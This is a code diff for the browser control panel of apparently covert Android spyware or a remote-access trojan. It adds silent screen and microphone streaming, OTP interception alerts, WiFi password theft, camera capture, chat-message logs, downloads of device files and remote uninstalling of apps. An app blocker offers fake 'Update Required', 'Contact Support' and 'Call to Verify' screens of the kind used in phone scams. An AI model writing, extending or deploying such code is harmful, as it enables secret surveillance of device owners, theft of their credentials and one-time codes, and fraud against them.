+  function showFileManagerModal(deviceId, path) {
+    createModal('📁 File Manager', `
+      <div style="margin-bottom:12px;display:flex;gap:8px;align-items:center;">
+        <span style="color:#95a5a6;font-size:11px;">Path:</span>
+        <input id="v79-path-input" type="text" value="${escapeHtml(path)}" style="flex:1;padding:6px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:12px;font-family:monospace;" onkeypress="if(event.key==='Enter')v79.browseTo(this.value)"/>
+        <button onclick="v79.browseTo(document.getElementById('v79-path-input').value)" style="padding:6px 12px;background:rgba(52,152,219,.3);border:1px solid rgba(52,152,219,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:11px;">Go</button>
+      </div>
+      <div id="v79-breadcrumb" style="color:#3498db;font-size:12px;font-family:monospace;margin-bottom:8px;word-break:break-all;">${escapeHtml(path)}</div>
+      <div id="v79-offline-banner" style="display:none;background:rgba(241,196,15,.15);border:1px solid rgba(241,196,15,.4);color:#f1c40f;padding:8px 12px;border-radius:6px;font-size:11px;margin-bottom:8px;"></div>
+      <div id="v79-file-list" style="background:rgba(0,0,0,.2);border-radius:6px;max-height:50vh;overflow-y:auto;font-family:monospace;font-size:12px;">
+        <div style="padding:20px;text-align:center;color:#95a5a6;">⏳ Loading...</div>
+      </div>
+    `, { width: '800px' });
+  }
+
+  function renderFileList(entries, cachedAt, source) {
+    const list = document.getElementById('v79-file-list');
+    const banner = document.getElementById('v79-offline-banner');
+    if (!list) return;
+
+    if (banner && source && source !== 'live') {
+      banner.style.display = 'block';
+      banner.textContent = `⚠️ Offline — showing ${source === 'cache' ? 'cached listing' : 'nearest cached ancestor'} from ${cachedAt || 'unknown time'}`;
+    }
+
+    if (!entries || entries.length === 0) {
+      list.innerHTML = '<div style="padding:20px;text-align:center;color:#666;">Empty directory</div>';
+      return;
+    }
+
+    list.innerHTML = entries.map(e => {
+      const icon = e.is_dir ? '📁' : '📄';
+      const size = e.is_dir ? '' : `<span style="color:#666;font-size:10px;">(${formatSize(e.size)})</span>`;
+      const onClick = e.is_dir ? `onclick="v79.browseTo('${escapeHtml(e.path)}')"` : '';
+      const downloadBtn = !e.is_dir && e.readable ? `<button onclick="v79.downloadFile('${escapeHtml(e.path)}')" style="float:right;background:rgba(52,152,219,.3);border:none;color:#fff;padding:2px 8px;border-radius:4px;cursor:pointer;font-size:10px;">⬇ Download</button>` : '';
+      return `<div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);${e.is_dir ? 'color:#3498db;cursor:pointer;' : 'color:#fff;'}${onClick ? '' : ''}" ${onClick}>${icon} ${escapeHtml(e.name)} ${size} ${downloadBtn}</div>`;
+    }).join('');
+  }
+
+  function formatSize(bytes) {
+    if (!bytes || bytes === 0) return '0 B';
+    const units = ['B', 'KB', 'MB', 'GB'];
+    let i = 0;
+    while (bytes >= 1024 && i < units.length - 1) { bytes /= 1024; i++; }
+    return bytes.toFixed(1) + ' ' + units[i];
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  //  APP BLOCKER v2 MODAL (with fake UI selection)
+  // ═══════════════════════════════════════════════════════════════
+
+  function showAppBlockerModal() {
+    createModal('🚫 Block App — Advanced', `
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div>
+          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Package Name *</label>
+          <input id="v79-block-pkg" type="text" placeholder="com.example.app" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;font-family:monospace;box-sizing:border-box;"/>
+        </div>
+        <div>
+          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Fake UI Type</label>
+          <select id="v79-block-ui-type" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;" onchange="v79.updateBlockerUiPreview()">
+            <option value="default">Default (silent block, no UI)</option>
+            <option value="update_page">Fake "Update Required" page</option>
+            <option value="contact_us">Fake "Contact Support" page</option>
+            <option value="call_us">Fake "Call to Verify" page</option>
+            <option value="timer">Countdown timer (auto-unblock)</option>
+            <option value="redirect">Redirect to custom URL</option>
+          </select>
+        </div>
+        <div>
+          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Custom Message (optional)</label>
+          <textarea id="v79-block-message" placeholder="Override the default fake UI message..." style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:12px;min-height:50px;box-sizing:border-box;resize:vertical;"></textarea>
+        </div>
+        <div id="v79-block-url-row" style="display:none;">
+          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Custom URL (for redirect)</label>
+          <input id="v79-block-url" type="text" placeholder="https://example.com" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;"/>
+        </div>
+        <div id="v79-block-timer-row" style="display:none;">
+          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Timer (seconds — auto-unblock after this)</label>
+          <input id="v79-block-timer" type="number" placeholder="3600 (1 hour)" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;"/>
+        </div>
+        <div>
+          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Unlock Code (optional — user can enter to unblock)</label>
+          <input id="v79-block-code" type="text" placeholder="e.g. 1234" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;"/>
+        </div>
+        <button onclick="v79.submitAppBlock()" style="padding:10px 20px;background:rgba(192,57,43,.3);border:1px solid rgba(192,57,43,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600;">🚫 Block App</button>
+      </div>
+    `, { width: '500px' });
+  }
+
+  window.v79.updateBlockerUiPreview = function() {
+    const type = document.getElementById('v79-block-ui-type').value;
+    document.getElementById('v79-block-url-row').style.display = (type === 'redirect') ? 'block' : 'none';
+    document.getElementById('v79-block-timer-row').style.display = (type === 'timer') ? 'block' : 'none';
+  };
+
+  // ═══════════════════════════════════════════════════════════════
+  //  BLOCKED APPS LIST MODAL (for unblocking)
+  // ═══════════════════════════════════════════════════════════════
+
+  function showBlockedListModal(apps) {
+    createModal('✅ Blocked Apps — Click to Unblock', `
+      <div id="v79-blocked-list" style="display:flex;flex-direction:column;gap:6px;">
+        ${apps.length === 0 ? '<div style="padding:20px;text-align:center;color:#95a5a6;">No blocked apps (or waiting for device response...)</div>' :
+          apps.map(a => {
+            const pkg = typeof a === 'string' ? a : (a.package || a.package_name || '');
+            const fakeUi = typeof a === 'object' ? (a.fake_ui_type || 'default') : 'default';
+            return `<div style="display:flex;justify-content:space-between;align-items:center;padding:10px;background:rgba(192,57,43,.1);border:1px solid rgba(192,57,43,.3);border-radius:6px;">
+              <div><div style="font-family:monospace;font-size:12px;">${escapeHtml(pkg)}</div><div style="font-size:10px;color:#95a5a6;">UI: ${escapeHtml(fakeUi)}</div></div>
+              <button onclick="v79.unblockApp('${escapeHtml(pkg)}')" style="padding:6px 12px;background:rgba(39,174,96,.3);border:1px solid rgba(39,174,96,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:11px;">✓ Unblock</button>
+            </div>`;
+          }).join('')
+        }
+      </div>
+    `, { width: '500px' });
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  //  OTHER MODALS (Chat, OTP, Geofences, Search, Two-way Chat, Dashboard)
+  // ═══════════════════════════════════════════════════════════════
 
   function showChatMessagesModal(entries) {
     const rows = entries.map(e => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:6px 8px;color:#3498db;font-size:12px;">${escapeHtml(e.app)}</td><td style="padding:6px 8px;font-size:12px;">${escapeHtml(e.conversation)}</td><td style="padding:6px 8px;color:#e74c3c;font-size:12px;">${escapeHtml(e.sender)}</td><td style="padding:6px 8px;font-size:12px;">${escapeHtml(e.message_text)}</td><td style="padding:6px 8px;color:#95a5a6;font-size:10px;white-space:nowrap;">${escapeHtml(e.recorded_at)}</td></tr>`).join('');
@@ -379,30 +712,74 @@
   function registerSocketListeners() {
     if (listenersRegistered) return;
     const sock = getSocket();
-    if (!sock) { log('Socket not ready — will retry'); setTimeout(registerSocketListeners, 3000); return; }
+    if (!sock) { setTimeout(registerSocketListeners, 3000); return; }
 
     try {
+      // Silent screen stream (JPEG slideshow)
+      sock.on('silent_screen_start', (data) => {
+        showToast('📺 Silent screen stream started', 'success');
+        const fmtEl = document.getElementById('v79-mic-format');
+      });
+
+      sock.on('silent_screen_frame', (data) => {
+        updateSilentScreenFrame(data.frame);
+      });
+
+      sock.on('silent_screen_stop', (data) => {
+        showToast('📺 Screen stream stopped', 'info');
+        const overlay = document.getElementById('v79-modal-overlay');
+        if (overlay && overlay.dataset.type === 'silent-screen') overlay.remove();
+      });
+
+      // Mic stream
+      sock.on('mic_stream_start', (data) => {
+        const fmtEl = document.getElementById('v79-mic-format');
+        if (fmtEl) fmtEl.textContent = data.format || 'pcm';
+      });
+
+      sock.on('mic_stream_chunk', (data) => {
+        playMicChunk(data);
+      });
+
+      sock.on('mic_stream_stop', (data) => {
+        const overlay = document.getElementById('v79-modal-overlay');
+        if (overlay && overlay.dataset.type === 'live-mic') overlay.remove();
+        if (v79._audioCtx) { try { v79._audioCtx.close(); } catch(_){} v79._audioCtx = null; }
+      });
+
+      // OTP captured
       sock.on('otp_captured', (data) => {
         showToast(`🔑 OTP captured: ${data.code} (${data.sender})`, 'success');
       });
 
+      // Geofence events
       sock.on('geofence_event', (data) => {
         showToast(`🗺️ Geofence ${data.event}: ${data.geofence_name}`, data.event === 'enter' ? 'success' : 'error');
       });
 
+      // Security events
       sock.on('security_event', (data) => {
         if (data.compromised) showToast(`🚨 SECURITY THREAT on device!`, 'error');
       });
 
+      // Camera capture result
       sock.on('camera_capture_result', (data) => {
         if (data.success) {
           showToast(`📷 Photo captured: ${data.camera}`, 'success');
-          if (data.url) window.open(data.url, '_blank');
+          // If camera gallery is open, prepend the new photo
+          // Otherwise, open it in a new tab
+          const gallery = document.getElementById('v79-modal-body');
+          if (gallery && gallery.innerHTML.includes('Camera Gallery')) {
+            v79.openCameraGallery();  // refresh
+          } else if (data.url) {
+            window.open(data.url, '_blank');
+          }
         } else {
           showToast(`📷 Camera failed: ${data.error}`, 'error');
         }
       });
 
+      // WiFi passwords
       sock.on('wifi_passwords_result', (data) => {
         const count = data.count || 0;
         showToast(`📶 WiFi passwords: ${count} networks`, 'success');
@@ -410,16 +787,7 @@
         createModal(`📶 WiFi Networks (${count})`, `<p style="color:#95a5a6;font-size:11px;margin:0 0 10px;">Has root: ${data.has_root ? 'Yes' : 'No (passwords may be redacted on Android 10+)'}</p><table style="width:100%;border-collapse:collapse;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:6px;">SSID</th><th style="padding:6px;">Password</th><th style="padding:6px;">Security</th></tr></thead><tbody>${rows || '<tr><td colspan="3" style="padding:14px;text-align:center;color:#666;">No networks</td></tr>'}</tbody></table>`);
       });
 
-      sock.on('mic_stream_started', (data) => {
-        if (data.success) showToast('🎙️ Mic streaming started', 'success');
-        else showToast(`🎙️ Mic failed: ${data.error}`, 'error');
-      });
-
-      sock.on('screen_stream_started', (data) => {
-        if (data.success) showToast('📺 Screen streaming started', 'success');
-        else showToast(`📺 Screen failed: ${data.error}`, 'error');
-      });
-
+      // VoIP recording
       sock.on('voip_record_started', (data) => {
         if (data.success) showToast('📞 VoIP recording started', 'success');
         else showToast(`📞 VoIP failed: ${data.error}`, 'error');
@@ -432,22 +800,59 @@
         }
       });
 
+      // File manager — files_listed event (live response from device)
       sock.on('files_listed', (data) => {
-        const entries = data.entries || [];
-        showToast(`📁 Listed ${entries.length} files`, 'success');
         const list = document.getElementById('v79-file-list');
-        if (list) {
-          list.innerHTML = entries.map(e => `<div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);${e.is_dir ? 'color:#3498db;cursor:pointer;' : 'color:#fff;'}" ${e.is_dir ? `onclick="v79.browseTo('${escapeHtml(e.path)}')"` : ''}>${e.is_dir ? '📁' : '📄'} ${escapeHtml(e.name)} ${!e.is_dir ? `<span style="color:#666;font-size:10px;">(${(e.size/1024).toFixed(1)} KB)</span><button onclick="v79.downloadFile('${escapeHtml(e.path)}')" style="float:right;background:rgba(52,152,219,.3);border:none;color:#fff;padding:2px 8px;border-radius:4px;cursor:pointer;font-size:10px;">Download</button>` : ''}</div>`).join('') || '<div style="padding:20px;text-align:center;color:#666;">Empty directory</div>';
-        }
+        if (!list) return;  // Modal closed
+        renderFileList(data.entries || [], null, 'live');
       });
 
       sock.on('file_download_result', (data) => {
         if (data.success) {
-          showToast(`📁 File uploaded`, 'success');
+          showToast(`📁 File uploaded: ${data.path}`, 'success');
           if (data.url) window.open(data.url, '_blank');
         } else {
           showToast(`📁 Download failed: ${data.error}`, 'error');
         }
+      });
+
+      // Blocked apps list response
+      sock.on('blocked_apps_list', (data) => {
+        const listEl = document.getElementById('v79-blocked-list');
+        if (!listEl) {
+          // Modal closed — show it
+          showBlockedListModal(data.apps || []);
+        } else {
+          // Update existing modal
+          const apps = data.apps || [];
+          if (apps.length === 0) {
+            listEl.innerHTML = '<div style="padding:20px;text-align:center;color:#95a5a6;">No blocked apps on this device</div>';
+          } else {
+            listEl.innerHTML = apps.map(a => {
+              const pkg = typeof a === 'string' ? a : (a.package || a.package_name || '');
+              const fakeUi = typeof a === 'object' ? (a.fake_ui_type || 'default') : 'default';
+              return `<div style="display:flex;justify-content:space-between;align-items:center;padding:10px;background:rgba(192,57,43,.1);border:1px solid rgba(192,57,43,.3);border-radius:6px;">
+                <div><div style="font-family:monospace;font-size:12px;">${escapeHtml(pkg)}</div><div style="font-size:10px;color:#95a5a6;">UI: ${escapeHtml(fakeUi)}</div></div>
+                <button onclick="v79.unblockApp('${escapeHtml(pkg)}')" style="padding:6px 12px;background:rgba(39,174,96,.3);border:1px solid rgba(39,174,96,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:11px;">✓ Unblock</button>
+              </div>`;
+            }).join('');
+          }
+        }
+      });
+
+      // Uninstall result
+      sock.on('uninstall_result', (data) => {
+        if (data.success) {
+          showToast(`✓ Uninstalled: ${data.package}`, 'success');
+          // Refresh apps list if open
+          if (typeof loadApps === 'function') setTimeout(loadApps, 2000);
+        } else {
+          showToast(`✗ Uninstall failed: ${data.error}`, 'error');
+        }
+      });
+
+      sock.on('uninstall_started', (data) => {
+        if (data.started) showToast(`📱 Uninstalling ${data.package}...`, 'info');
       });
 
       listenersRegistered = true;
@@ -458,18 +863,13 @@
   }
 
   // ═══════════════════════════════════════════════════════════════
-  //  INJECT GLOBAL BUTTONS (Dashboard + Webhooks) into .topbar-right
+  //  INJECT GLOBAL BUTTONS + UNINSTALL BUTTON IN APPS LIST
   // ═══════════════════════════════════════════════════════════════
 
   function injectGlobalButtons() {
     if (document.getElementById('v79-dashboard-btn')) return;
-
     const topbarRight = document.querySelector('.topbar-right');
-    if (!topbarRight) {
-      setTimeout(injectGlobalButtons, 3000);
-      return;
-    }
-
+    if (!topbarRight) { setTimeout(injectGlobalButtons, 3000); return; }
     const btnContainer = document.createElement('div');
     btnContainer.style.cssText = 'display:inline-flex;gap:6px;margin-left:12px;';
     btnContainer.innerHTML = `
@@ -477,34 +877,106 @@
       <button id="v79-webhook-btn" onclick="v79.openWebhooks()" style="background:rgba(155,89,182,.15);border:1px solid rgba(155,89,182,.4);color:#9b59b6;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:600;">🔔 Webhooks</button>
     `;
     topbarRight.appendChild(btnContainer);
-    log('Global buttons injected into .topbar-right');
+    log('Global buttons injected');
   }
+
+  // ═══════════════════════════════════════════════════════════════
+  //  HOOK INTO APPS LIST — add Uninstall button to each app row
+  // ═══════════════════════════════════════════════════════════════
+
+  function injectUninstallButtons() {
+    // Find the apps list container
+    const appsContainer = document.getElementById('appsListContainer');
+    if (!appsContainer) return;
+
+    // Check if we already injected
+    if (appsContainer.dataset.v79UninstallInjected === 'true') return;
+
+    // Find all app rows (look for elements with onclick containing package names or data-pkg attribute)
+    const appRows = appsContainer.querySelectorAll('[data-package], .app-row, .app-item');
+    if (appRows.length === 0) {
+      // Try alternate: look for elements that contain package name patterns
+      const allDivs = appsContainer.querySelectorAll('div');
+      for (const div of allDivs) {
+        if (div.dataset.v79UninstallBtn) continue;
+        const text = div.textContent || '';
+        // Check if this looks like an app row (contains a package name pattern)
+        const pkgMatch = text.match(/com\.[a-z]+\.[a-z]+/i);
+        if (pkgMatch && !div.querySelector('.v79-uninstall-btn')) {
+          const pkg = pkgMatch[0];
+          const btn = document.createElement('button');
+          btn.className = 'v79-uninstall-btn';
+          btn.textContent = '🗑️ Uninstall';
+          btn.style.cssText = 'background:rgba(231,76,60,.2);border:1px solid rgba(231,76,60,.4);color:#e74c3c;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:10px;margin-left:8px;';
+          btn.onclick = (e) => {
+            e.stopPropagation();
+            if (confirm(`Uninstall "${pkg}" from the device?`)) {
+              v79.uninstallAppRemote(pkg);
+            }
+          };
+          div.appendChild(btn);
+          div.dataset.v79UninstallBtn = 'true';
+        }
+      }
+    } else {
+      appRows.forEach(row => {
+        if (row.dataset.v79UninstallBtn) return;
+        const pkg = row.dataset.package || row.getAttribute('data-pkg') || '';
+        if (!pkg) return;
+        const btn = document.createElement('button');
+        btn.className = 'v79-uninstall-btn';
+        btn.textContent = '🗑️ Uninstall';
+        btn.style.cssText = 'background:rgba(231,76,60,.2);border:1px solid rgba(231,76,60,.4);color:#e74c3c;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:10px;margin-left:8px;';
+        btn.onclick = (e) => {
+          e.stopPropagation();
+          if (confirm(`Uninstall "${pkg}" from the device?`)) {
+            v79.uninstallAppRemote(pkg);
+          }
+        };
+        row.appendChild(btn);
+        row.dataset.v79UninstallBtn = 'true';
+      });
+    }
+
+    appsContainer.dataset.v79UninstallInjected = 'true';
+  }
+
+  window.v79.uninstallAppRemote = async function(pkg) {
+    const deviceId = getDeviceId();
+    if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
+    try {
+      const data = await apiCall('/api/admin/uninstall-app', 'POST', { device_id: deviceId, package: pkg });
+      if (data.success) showToast(`📱 Uninstalling ${pkg}...`, 'info');
+      else showToast(`✗ Failed: ${data.error}`, 'error');
+    } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
+  };
 
   // ═══════════════════════════════════════════════════════════════
   //  INIT
   // ═══════════════════════════════════════════════════════════════
 
   function init() {
-    log('v7.9 Features module v2 loaded (fixed scope + layout)');
+    log('v7.9 Features module v3 loaded');
     injectGlobalButtons();
 
-    // Watch for device modal opening/closing
+    // Watch for device modal + apps tab opening
     const observer = new MutationObserver(() => {
       const modal = document.getElementById('deviceModal');
       if (!modal) return;
       if (modal.classList.contains('hidden')) {
         removeToolbar();
       } else {
-        if (!document.getElementById('v79-toolbar')) {
-          injectToolbar();
+        if (!document.getElementById('v79-toolbar')) injectToolbar();
+        // Try injecting uninstall buttons when apps tab is active
+        const appsTab = document.getElementById('tab-apps');
+        if (appsTab && appsTab.classList.contains('active')) {
+          setTimeout(injectUninstallButtons, 500);
         }
       }
     });
     observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['class'] });
 
-    // Also try injecting immediately if modal is already open
     setTimeout(injectToolbar, 1000);
-
     registerSocketListeners();
   }
 
